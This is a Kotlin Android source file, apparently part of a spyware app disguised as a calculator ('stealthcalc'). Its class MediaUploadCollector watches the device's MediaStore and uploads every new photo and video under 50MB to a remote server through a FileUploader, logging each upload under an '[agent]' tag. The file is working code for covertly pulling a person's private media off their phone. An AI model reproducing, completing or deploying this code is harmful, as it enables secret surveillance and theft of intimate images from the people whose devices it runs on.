package com.stealthcalc.monitoring.collector

import android.content.ContentUris
import android.content.Context
import android.provider.MediaStore
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class MediaUploadCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    private var lastImageId: Long = getMaxId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
    private var lastVideoId: Long = getMaxId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)

    suspend fun collect() = withContext(Dispatchers.IO) {
        if (!repository.isMetricEnabled("media_upload")) return@withContext
        uploadNew(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "IMAGE", lastImageId) { lastImageId = it }
        uploadNew(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "VIDEO", lastVideoId) { lastVideoId = it }
    }

    private suspend fun uploadNew(
        contentUri: android.net.Uri,
        mediaType: String,
        lastId: Long,
        updateLastId: (Long) -> Unit,
    ) {
        val cursor = context.contentResolver.query(
            contentUri,
            arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_ADDED,
            ),
            "${MediaStore.MediaColumns._ID} > ?",
            arrayOf(lastId.toString()),
            "${MediaStore.MediaColumns._ID} ASC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(0)
                val name = it.getString(1) ?: "unknown"
                val mime = it.getString(2) ?: "application/octet-stream"
                val size = it.getLong(3)
                val dateAdded = it.getLong(4)

                if (size > 50 * 1024 * 1024) {
                    AppLogger.log(context, "[agent]", "Skipping large $mediaType ($name, ${size / 1024 / 1024}MB)")
                    updateLastId(id)
                    continue
                }

                val uri = ContentUris.withAppendedId(contentUri, id)
                val success = uploader.uploadUri(
                    uri = uri,
                    fileName = name,
                    mimeType = mime,
                    category = mediaType.lowercase(),
                    capturedAt = dateAdded * 1000,
                )
                if (success) {
                    AppLogger.log(context, "[agent]", "Uploaded $mediaType: $name")
                }
                updateLastId(id)
            }
        }
    }

    private fun getMaxId(uri: android.net.Uri): Long {
        return runCatching {
            context.contentResolver.query(
                uri, arrayOf("MAX(${MediaStore.MediaColumns._ID})"), null, null, null
            )?.use { if (it.moveToFirst()) it.getLong(0) else 0L } ?: 0L
        }.getOrDefault(0L)
    }
}
